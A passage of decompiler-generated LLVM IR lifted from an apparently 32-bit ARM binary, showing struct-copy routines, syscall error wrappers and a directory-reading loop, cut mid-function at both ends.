  %v1_13f54 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f54 = add i32 %v1_13f54, 48
  %v3_13f54 = inttoptr i32 %v2_13f54 to i32*
  store i32 %v0_13f54, i32* %v3_13f54, align 4
  %v0_13f58 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f58 = add i32 %v0_13f58, 72
  %v1_13f5c = inttoptr i32 %v1_13f58 to i32*
  %v2_13f5c = load i32, i32* %v1_13f5c, align 4
  %v3_13f5c = add i32 %v0_13f58, 76
  %v4_13f5c = inttoptr i32 %v3_13f5c to i32*
  %v5_13f5c = load i32, i32* %v4_13f5c, align 4
  store i32 %v5_13f5c, i32* %r1.global-to-local, align 4
  %v0_13f60 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f60 = add i32 %v0_13f60, 56
  %v1_13f64 = inttoptr i32 %v1_13f60 to i32*
  store i32 %v2_13f5c, i32* %v1_13f64, align 4
  %v3_13f64 = add i32 %v0_13f60, 60
  %v4_13f64 = inttoptr i32 %v3_13f64 to i32*
  %v5_13f64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13f64, i32* %v4_13f64, align 4
  %v0_13f68 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f68 = add i32 %v0_13f68, 80
  %v1_13f6c = inttoptr i32 %v1_13f68 to i32*
  %v2_13f6c = load i32, i32* %v1_13f6c, align 4
  %v3_13f6c = add i32 %v0_13f68, 84
  %v4_13f6c = inttoptr i32 %v3_13f6c to i32*
  %v5_13f6c = load i32, i32* %v4_13f6c, align 4
  store i32 %v5_13f6c, i32* %r1.global-to-local, align 4
  %v0_13f70 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f70 = add i32 %v0_13f70, 64
  %v1_13f74 = inttoptr i32 %v1_13f70 to i32*
  store i32 %v2_13f6c, i32* %v1_13f74, align 4
  %v3_13f74 = add i32 %v0_13f70, 68
  %v4_13f74 = inttoptr i32 %v3_13f74 to i32*
  %v5_13f74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13f74, i32* %v4_13f74, align 4
  %v0_13f78 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f78 = add i32 %v0_13f78, 16
  %v2_13f78 = inttoptr i32 %v1_13f78 to i32*
  %v3_13f78 = load i32, i32* %v2_13f78, align 4
  %v1_13f7c = load i32, i32* %r6.global-to-local, align 4
  %v2_13f7c = add i32 %v1_13f7c, 16
  %v3_13f7c = inttoptr i32 %v2_13f7c to i32*
  store i32 %v3_13f78, i32* %v3_13f7c, align 4
  %v0_13f80 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f80 = add i32 %v0_13f80, 88
  %v1_13f84 = add i32 %v0_13f80, 20
  %v2_13f84 = inttoptr i32 %v1_13f84 to i32*
  %v3_13f84 = load i32, i32* %v2_13f84, align 4
  store i32 %v3_13f84, i32* %r2.global-to-local, align 4
  %v1_13f88 = inttoptr i32 %v1_13f80 to i32*
  %v2_13f88 = load i32, i32* %v1_13f88, align 4
  %v3_13f88 = add i32 %v0_13f80, 92
  %v4_13f88 = inttoptr i32 %v3_13f88 to i32*
  %v5_13f88 = load i32, i32* %v4_13f88, align 4
  store i32 %v5_13f88, i32* %r1.global-to-local, align 4
  %v0_13f8c = load i32, i32* %r6.global-to-local, align 4
  %v1_13f8c = add i32 %v0_13f8c, 72
  %v1_13f90 = inttoptr i32 %v1_13f8c to i32*
  store i32 %v2_13f88, i32* %v1_13f90, align 4
  %v3_13f90 = add i32 %v0_13f8c, 76
  %v4_13f90 = inttoptr i32 %v3_13f90 to i32*
  %v5_13f90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13f90, i32* %v4_13f90, align 4
  %v0_13f94 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f94 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f94 = add i32 %v1_13f94, 20
  %v3_13f94 = inttoptr i32 %v2_13f94 to i32*
  store i32 %v0_13f94, i32* %v3_13f94, align 4
  %v0_13f98 = load i32, i32* %ip.global-to-local, align 4
  %v1_13f98 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f98 = add i32 %v1_13f98, 24
  %v3_13f98 = inttoptr i32 %v2_13f98 to i32*
  store i32 %v0_13f98, i32* %v3_13f98, align 4
  %v0_13f9c = load i32, i32* %lr.global-to-local, align 4
  %v1_13f9c = load i32, i32* %r6.global-to-local, align 4
  %v2_13f9c = add i32 %v1_13f9c, 28
  %v3_13f9c = inttoptr i32 %v2_13f9c to i32*
  store i32 %v0_13f9c, i32* %v3_13f9c, align 4
  %v2_13fa0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13fa0, i32* %r4.global-to-local, align 4
  ret i32 %v2_13f88

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_13fa8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13fa8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_13fc4 = inttoptr i32 %arg2 to i8*
  %v3_13fc4 = call i32 @function_11260(i8* %v2_13fc4, i32 0)
  %v1_13fc8 = add i32 %tmp, 4
  %v2_13fc8 = inttoptr i32 %v1_13fc8 to i32*
  %v3_13fc8 = load i32, i32* %v2_13fc8, align 4
  %v2_13fcc = load i32, i32* %arg1, align 4
  store i32 %v2_13fcc, i32* %r8.global-to-local, align 4
  %v1_13fd0 = load i32, i32* %r5.global-to-local, align 4
  %v2_13fd0 = add i32 %v1_13fd0, 12
  %v3_13fd0 = inttoptr i32 %v2_13fd0 to i32*
  store i32 %v3_13fc8, i32* %v3_13fd0, align 4
  %v0_13fd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fd4 = add i32 %v0_13fd4, 20
  %v2_13fd4 = inttoptr i32 %v1_13fd4 to i32*
  %v3_13fd4 = load i32, i32* %v2_13fd4, align 4
  %v1_13fd8 = add i32 %v0_13fd4, 16
  %v2_13fd8 = inttoptr i32 %v1_13fd8 to i32*
  %v3_13fd8 = load i32, i32* %v2_13fd8, align 4
  store i32 %v3_13fd8, i32* %r6.global-to-local, align 4
  %v1_13fdc = load i32, i32* %r5.global-to-local, align 4
  %v2_13fdc = add i32 %v1_13fdc, 44
  %v3_13fdc = inttoptr i32 %v2_13fdc to i32*
  store i32 %v3_13fd4, i32* %v3_13fdc, align 4
  %v0_13fe0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fe0 = add i32 %v0_13fe0, 24
  %v2_13fe0 = inttoptr i32 %v1_13fe0 to i32*
  %v3_13fe0 = load i32, i32* %v2_13fe0, align 4
  %v1_13fe4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13fe4 = add i32 %v1_13fe4, 48
  %v3_13fe4 = inttoptr i32 %v2_13fe4 to i32*
  store i32 %v3_13fe0, i32* %v3_13fe4, align 4
  %v0_13fe8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fe8 = add i32 %v0_13fe8, 28
  %v2_13fe8 = inttoptr i32 %v1_13fe8 to i32*
  %v3_13fe8 = load i32, i32* %v2_13fe8, align 4
  %v1_13fec = load i32, i32* %r5.global-to-local, align 4
  %v2_13fec = add i32 %v1_13fec, 52
  %v3_13fec = inttoptr i32 %v2_13fec to i32*
  store i32 %v3_13fe8, i32* %v3_13fec, align 4
  %v0_13ff0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ff0 = add i32 %v0_13ff0, 32
  %v1_13ff4 = inttoptr i32 %v1_13ff0 to i32*
  %v2_13ff4 = load i32, i32* %v1_13ff4, align 4
  %v3_13ff4 = add i32 %v0_13ff0, 36
  %v4_13ff4 = inttoptr i32 %v3_13ff4 to i32*
  %v5_13ff4 = load i32, i32* %v4_13ff4, align 4
  store i32 %v5_13ff4, i32* %r1.global-to-local, align 4
  %v0_13ff8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ff8 = add i32 %v0_13ff8, 56
  %v1_13ffc = inttoptr i32 %v1_13ff8 to i32*
  store i32 %v2_13ff4, i32* %v1_13ffc, align 4
  %v3_13ffc = add i32 %v0_13ff8, 60
  %v4_13ffc = inttoptr i32 %v3_13ffc to i32*
  %v5_13ffc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13ffc, i32* %v4_13ffc, align 4
  %v0_14000 = load i32, i32* %r4.global-to-local, align 4
  %v1_14000 = add i32 %v0_14000, 40
  %v1_14004 = inttoptr i32 %v1_14000 to i32*
  %v2_14004 = load i32, i32* %v1_14004, align 4
  %v3_14004 = add i32 %v0_14000, 44
  %v4_14004 = inttoptr i32 %v3_14004 to i32*
  %v5_14004 = load i32, i32* %v4_14004, align 4
  store i32 %v5_14004, i32* %r1.global-to-local, align 4
  %v0_14008 = load i32, i32* %r5.global-to-local, align 4
  %v1_14008 = add i32 %v0_14008, 64
  %v1_1400c = inttoptr i32 %v1_14008 to i32*
  store i32 %v2_14004, i32* %v1_1400c, align 4
  %v3_1400c = add i32 %v0_14008, 68
  %v4_1400c = inttoptr i32 %v3_1400c to i32*
  %v5_1400c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1400c, i32* %v4_1400c, align 4
  %v0_14010 = load i32, i32* %r4.global-to-local, align 4
  %v1_14010 = add i32 %v0_14010, 48
  %v1_14014 = inttoptr i32 %v1_14010 to i32*
  %v2_14014 = load i32, i32* %v1_14014, align 4
  %v3_14014 = add i32 %v0_14010, 52
  %v4_14014 = inttoptr i32 %v3_14014 to i32*
  %v5_14014 = load i32, i32* %v4_14014, align 4
  store i32 %v5_14014, i32* %r1.global-to-local, align 4
  %v1_14018 = add i32 %v0_14010, 8
  %v2_14018 = inttoptr i32 %v1_14018 to i16*
  %v3_14018 = load i16, i16* %v2_14018, align 2
  %v4_14018 = zext i16 %v3_14018 to i32
  store i32 %v4_14018, i32* %r2.global-to-local, align 4
  %v1_1401c = add i32 %v0_14010, 10
  %v2_1401c = inttoptr i32 %v1_1401c to i16*
  %v3_1401c = load i16, i16* %v2_1401c, align 2
  %v4_1401c = zext i16 %v3_1401c to i32
  store i32 %v4_1401c, i32* %ip.global-to-local, align 4
  %v1_14020 = add i32 %v0_14010, 12
  %v2_14020 = inttoptr i32 %v1_14020 to i16*
  %v3_14020 = load i16, i16* %v2_14020, align 2
  %v4_14020 = zext i16 %v3_14020 to i32
  store i32 %v4_14020, i32* %lr.global-to-local, align 4
  %v1_14024 = add i32 %v0_14010, 14
  %v2_14024 = inttoptr i32 %v1_14024 to i16*
  %v3_14024 = load i16, i16* %v2_14024, align 2
  %v4_14024 = zext i16 %v3_14024 to i32
  store i32 %v4_14024, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_14030 = load i32, i32* %r5.global-to-local, align 4
  %v1_14030 = add i32 %v0_14030, 72
  %v1_14034 = inttoptr i32 %v1_14030 to i32*
  store i32 %v2_14014, i32* %v1_14034, align 4
  %v3_14034 = add i32 %v0_14030, 76
  %v4_14034 = inttoptr i32 %v3_14034 to i32*
  %v5_14034 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14034, i32* %v4_14034, align 4
  %v0_14038 = load i32, i32* %r5.global-to-local, align 4
  %v1_14038 = inttoptr i32 %v0_14038 to i32*
  %v2_14038 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_14038, i32* %v1_14038, align 4
  %v3_14038 = add i32 %v0_14038, 4
  %v4_14038 = inttoptr i32 %v3_14038 to i32*
  %v5_14038 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_14038, i32* %v4_14038, align 4
  %v0_1403c = load i32, i32* %r6.global-to-local, align 4
  %v1_1403c = load i32, i32* %r5.global-to-local, align 4
  %v2_1403c = add i32 %v1_1403c, 32
  %v3_1403c = inttoptr i32 %v2_1403c to i32*
  store i32 %v0_1403c, i32* %v3_1403c, align 4
  %v0_14040 = load i32, i32* %r7.global-to-local, align 4
  %v1_14040 = load i32, i32* %r5.global-to-local, align 4
  %v2_14040 = add i32 %v1_14040, 36
  %v3_14040 = inttoptr i32 %v2_14040 to i32*
  store i32 %v0_14040, i32* %v3_14040, align 4
  %v0_14044 = load i32, i32* %r2.global-to-local, align 4
  %v1_14044 = load i32, i32* %r5.global-to-local, align 4
  %v2_14044 = add i32 %v1_14044, 16
  %v3_14044 = inttoptr i32 %v2_14044 to i32*
  store i32 %v0_14044, i32* %v3_14044, align 4
  %v0_14048 = load i32, i32* %ip.global-to-local, align 4
  %v1_14048 = load i32, i32* %r5.global-to-local, align 4
  %v2_14048 = add i32 %v1_14048, 20
  %v3_14048 = inttoptr i32 %v2_14048 to i32*
  store i32 %v0_14048, i32* %v3_14048, align 4
  %v0_1404c = load i32, i32* %lr.global-to-local, align 4
  %v1_1404c = load i32, i32* %r5.global-to-local, align 4
  %v2_1404c = add i32 %v1_1404c, 24
  %v3_1404c = inttoptr i32 %v2_1404c to i32*
  store i32 %v0_1404c, i32* %v3_1404c, align 4
  %v0_14050 = load i32, i32* %r4.global-to-local, align 4
  %v1_14050 = load i32, i32* %r5.global-to-local, align 4
  %v2_14050 = add i32 %v1_14050, 28
  %v3_14050 = inttoptr i32 %v2_14050 to i32*
  store i32 %v0_14050, i32* %v3_14050, align 4
  ret i32 %v2_14014

; uselistorder directives
  uselistorder i32 %v0_14010, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 68, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 60, { 3, 4, 1, 5, 6, 0, 2, 7 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @function_14060() local_unnamed_addr {
dec_label_pc_14060:
  %stack_var_-16 = alloca i32, align 4
  %v2_14064 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14070 = call i32 @function_15d98(i32 7, i32 %v2_14064)
  %v1_14074 = icmp slt i32 %v2_14070, 0
  %v5_14078 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14074, i32 256, i32 %v5_14078
  ret i32 %storemerge
}

define i32 @function_1408c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1408c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1408c = load i32, i32* @r7, align 4
  store i32 %v3_1408c, i32* %stack_var_-8, align 4
  %v0_14098 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14098, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14098, -4095
  br i1 %tmp, label %dec_label_pc_140b8, label %dec_label_pc_140a8

dec_label_pc_140a8:                               ; preds = %dec_label_pc_1408c
  %v0_140a8 = call i32 @function_11204()
  %v0_140ac = load i32, i32* %r7.global-to-local, align 4
  %v1_140ac = sub i32 0, %v0_140ac
  %v2_140b0 = inttoptr i32 %v0_140a8 to i32*
  store i32 %v1_140ac, i32* %v2_140b0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_140b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140b8

dec_label_pc_140b8:                               ; preds = %dec_label_pc_1408c, %dec_label_pc_140a8
  %v1_140bc = phi i32 [ %v0_14098, %dec_label_pc_1408c ], [ -1, %dec_label_pc_140a8 ]
  %v2_140b8 = phi i32 [ %v3_1408c, %dec_label_pc_1408c ], [ %v2_140b8.pre, %dec_label_pc_140a8 ]
  store i32 %v2_140b8, i32* @r7, align 4
  ret i32 %v1_140bc

; uselistorder directives
  uselistorder i32 %v0_14098, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140b8, { 1, 0 }
}

define i32 @function_140c0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_140c0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140c0 = load i32, i32* @r7, align 4
  store i32 %v3_140c0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_140e8, label %dec_label_pc_140d8

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140c0
  %v0_140d8 = call i32 @function_11204()
  %v0_140dc = load i32, i32* %r7.global-to-local, align 4
  %v1_140dc = sub i32 0, %v0_140dc
  %v2_140e0 = inttoptr i32 %v0_140d8 to i32*
  store i32 %v1_140dc, i32* %v2_140e0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_140ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140e8

dec_label_pc_140e8:                               ; preds = %dec_label_pc_140c0, %dec_label_pc_140d8
  %v2_140ec = phi i32 [ %v3_140c0, %dec_label_pc_140c0 ], [ %v2_140ec.pre, %dec_label_pc_140d8 ]
  %v0_140e8 = phi i32 [ %arg1, %dec_label_pc_140c0 ], [ -1, %dec_label_pc_140d8 ]
  store i32 %v2_140ec, i32* @r7, align 4
  ret i32 %v0_140e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_140e8, { 1, 0 }
}

define i32 @function_140f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_140f4:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14128, label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_140f4
  %v0_14118 = call i32 @function_11204()
  %v0_1411c = load i32, i32* %r4.global-to-local, align 4
  %v1_1411c = sub i32 0, %v0_1411c
  %v2_14120 = inttoptr i32 %v0_14118 to i32*
  store i32 %v1_1411c, i32* %v2_14120, align 4
  br label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_140f4, %dec_label_pc_14118
  %v1_14130 = phi i32 [ %arg1, %dec_label_pc_140f4 ], [ -1, %dec_label_pc_14118 ]
  ret i32 %v1_14130

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14128, { 1, 0 }
}

define i32 @function_14134(i32 %arg1) local_unnamed_addr {
dec_label_pc_14134:
  %v1_14144 = load i32, i32* @r0, align 4
  ret i32 %v1_14144
}

define i32 @function_14148(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14148:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14148 = load i32, i32* @r7, align 4
  store i32 %v3_14148, i32* %stack_var_-8, align 4
  %v0_14154 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14154, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14154, -4095
  br i1 %tmp, label %dec_label_pc_14174, label %dec_label_pc_14164

dec_label_pc_14164:                               ; preds = %dec_label_pc_14148
  %v0_14164 = call i32 @function_11204()
  %v0_14168 = load i32, i32* %r7.global-to-local, align 4
  %v1_14168 = sub i32 0, %v0_14168
  %v2_1416c = inttoptr i32 %v0_14164 to i32*
  store i32 %v1_14168, i32* %v2_1416c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14174.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14174

dec_label_pc_14174:                               ; preds = %dec_label_pc_14148, %dec_label_pc_14164
  %v1_14178 = phi i32 [ %v0_14154, %dec_label_pc_14148 ], [ -1, %dec_label_pc_14164 ]
  %v2_14174 = phi i32 [ %v3_14148, %dec_label_pc_14148 ], [ %v2_14174.pre, %dec_label_pc_14164 ]
  store i32 %v2_14174, i32* @r7, align 4
  ret i32 %v1_14178

; uselistorder directives
  uselistorder i32 %v0_14154, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14174, { 1, 0 }
}

define i32 @function_1417c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1417c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14180.outer

dec_label_pc_14180.outer:                         ; preds = %dec_label_pc_14198, %dec_label_pc_1417c
  %v0_14180.ph = phi i32 [ %v0_14180.pre.pre, %dec_label_pc_14198 ], [ %arg1, %dec_label_pc_1417c ]
  %tmp = icmp ult i32 %v0_14180.ph, -4095
  br label %dec_label_pc_14180

dec_label_pc_14180:                               ; preds = %dec_label_pc_14180.outer, %dec_label_pc_14180
  br i1 %tmp, label %dec_label_pc_14180, label %dec_label_pc_14198

dec_label_pc_14198:                               ; preds = %dec_label_pc_14180
  %v0_14198 = call i32 @function_11204()
  %v1_1419c = sub i32 0, %v0_14180.ph
  %v2_141a0 = inttoptr i32 %v0_14198 to i32*
  store i32 %v1_1419c, i32* %v2_141a0, align 4
  %v0_14180.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14180.outer

; uselistorder directives
  uselistorder i32 %v0_14180.ph, { 1, 0 }
  uselistorder label %dec_label_pc_14180, { 1, 0 }
}

define i32 @function_141a8(i32* %arg1) local_unnamed_addr {
dec_label_pc_141a8:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 124820, i32* @r6, align 4
  %v1_141bc = add i32 %tmp, 24
  store i32 %v1_141bc, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_141d4 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  store i32 %v4_141d4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_141d4)
  %v0_141e8 = load i32, i32* @r6, align 4
  %v2_141e8 = add i32 %v0_141e8, 16
  %v3_141e8 = inttoptr i32 %v2_141e8 to i32*
  %v4_141e8 = load i32, i32* %v3_141e8, align 4
  store i32 %v4_141e8, i32* %ip.global-to-local, align 4
  store i32 82420, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_141e8)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %dec_label_pc_14228, %dec_label_pc_141a8
  %v0_141f8 = load i32, i32* @r5, align 4
  %v1_141f8 = add i32 %v0_141f8, 4
  %v2_141f8 = inttoptr i32 %v1_141f8 to i32*
  %v3_141f8 = load i32, i32* %v2_141f8, align 4
  %v4_141f8 = add i32 %v0_141f8, 8
  %v5_141f8 = inttoptr i32 %v4_141f8 to i32*
  %v6_141f8 = load i32, i32* %v5_141f8, align 4
  %tmp10 = icmp ugt i32 %v6_141f8, %v3_141f8
  br i1 %tmp10, label %dec_label_pc_14228, label %dec_label_pc_14204

dec_label_pc_14204:                               ; preds = %dec_label_pc_141f8
  %v1_14204 = inttoptr i32 %v0_141f8 to i32*
  %v2_14204 = load i32, i32* %v1_14204, align 4
  %v1_14208 = add i32 %v0_141f8, 12
  %v2_14208 = inttoptr i32 %v1_14208 to i32*
  %v3_14208 = load i32, i32* %v2_14208, align 4
  %v1_1420c = add i32 %v0_141f8, 20
  %v2_1420c = inttoptr i32 %v1_1420c to i32*
  %v3_1420c = load i32, i32* %v2_1420c, align 4
  %v4_14210 = inttoptr i32 %v3_14208 to i32*
  %v5_14210 = call i32 @function_15dcc(i32 %v2_14204, i32* %v4_14210, i32 %v3_1420c, i32 %v6_141f8)
  %tmp9 = icmp slt i32 %v5_14210, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_14220

.thread:                                          ; preds = %dec_label_pc_14204
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14258

dec_label_pc_14220:                               ; preds = %dec_label_pc_14204
  %v1_14220 = load i32, i32* @r5, align 4
  %v2_14220 = add i32 %v1_14220, 8
  %v3_14220 = inttoptr i32 %v2_14220 to i32*
  store i32 %v5_14210, i32* %v3_14220, align 4
  %v0_14224 = load i32, i32* @r7, align 4
  %v1_14224 = load i32, i32* @r5, align 4
  %v2_14224 = add i32 %v1_14224, 4
  %v3_14224 = inttoptr i32 %v2_14224 to i32*
  store i32 %v0_14224, i32* %v3_14224, align 4
  %v0_14228.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %dec_label_pc_141f8, %dec_label_pc_14220
  %v1_1424c = phi i32 [ %v0_141f8, %dec_label_pc_141f8 ], [ %v0_14228.pre, %dec_label_pc_14220 ]
  %v1_14228 = add i32 %v1_1424c, 4
  %v2_14228 = inttoptr i32 %v1_14228 to i32*
  %v3_14228 = load i32, i32* %v2_14228, align 4
  %v1_1422c = add i32 %v1_1424c, 12
  %v2_1422c = inttoptr i32 %v1_1422c to i32*
  %v3_1422c = load i32, i32* %v2_1422c, align 4
  %v2_14230 = add i32 %v3_1422c, %v3_14228
  store i32 %v2_14230, i32* @r4, align 4
  %v3_14234 = inttoptr i32 %v2_14230 to i32*
  %v4_14234 = load i32, i32* %v3_14234, align 4
  %v1_14238 = add i32 %v2_14230, 4
  %v2_14238 = inttoptr i32 %v1_14238 to i32*
  %v3_14238 = load i32, i32* %v2_14238, align 4
  %v1_1423c = add i32 %v2_14230, 16
  %v2_1423c = inttoptr i32 %v1_1423c to i16*
  %v3_1423c = load i16, i16* %v2_1423c, align 2
  %v4_1423c = zext i16 %v3_1423c to i32
  %v1_14240 = add i32 %v2_14230, 8
  %v2_14240 = inttoptr i32 %v1_14240 to i32*
  %v3_14240 = load i32, i32* %v2_14240, align 4
  store i32 %v3_14240, i32* %ip.global-to-local, align 4
  %v2_14244 = add i32 %v4_1423c, %v3_14228
  %v2_14248 = or i32 %v3_14238, %v4_14234
  %v4_14248 = icmp eq i32 %v2_14248, 0
  store i32 %v2_14244, i32* %v2_14228, align 4
  %v0_14250 = load i32, i32* %ip.global-to-local, align 4
  %v1_14250 = load i32, i32* @r5, align 4
  %v2_14250 = add i32 %v1_14250, 16
  %v3_14250 = inttoptr i32 %v2_14250 to i32*
  store i32 %v0_14250, i32* %v3_14250, align 4
  br i1 %v4_14248, label %dec_label_pc_141f8, label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %dec_label_pc_14228, %.thread
  %v0_14264 = load i32, i32* @r6, align 4
  %v2_14264 = add i32 %v0_14264, 24
  %v3_14264 = inttoptr i32 %v2_14264 to i32*
  %v4_14264 = load i32, i32* %v3_14264, align 4
  store i32 %v4_14264, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14264)
  %v0_14270 = load i32, i32* @r4, align 4
  ret i32 %v0_14270

; uselistorder directives
  uselistorder i32 %v2_14230, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_1424c, { 1, 0 }
  uselistorder i32 %v6_141f8, { 1, 0 }
  uselistorder i32 %v0_141f8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_14228, { 1, 0 }
}

define i32 @function_14284(i32 %arg1) local_unnamed_addr {
dec_label_pc_14284:
  %v0_14284 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14284, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14284
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14284, %bb
  %v10_14290 = phi i32 [ %arg1, %dec_label_pc_14284 ], [ 0, %bb ]
  ret i32 %v10_14290

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14294(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14294:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_14294 = load i32, i32* @r4, align 4
  %v6_14294 = load i32, i32* @r5, align 4
  %v9_14294 = load i32, i32* @r6, align 4
  %v12_14294 = load i32, i32* @r7, align 4
  %v15_14294 = load i32, i32* @r8, align 4
  %v18_14294 = load i32, i32* @sb, align 4
  %v21_14294 = load i32, i32* @sl, align 4
  %v24_14294 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14298 = icmp eq i32* %arg1, null
  store i1 %v2_14298, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
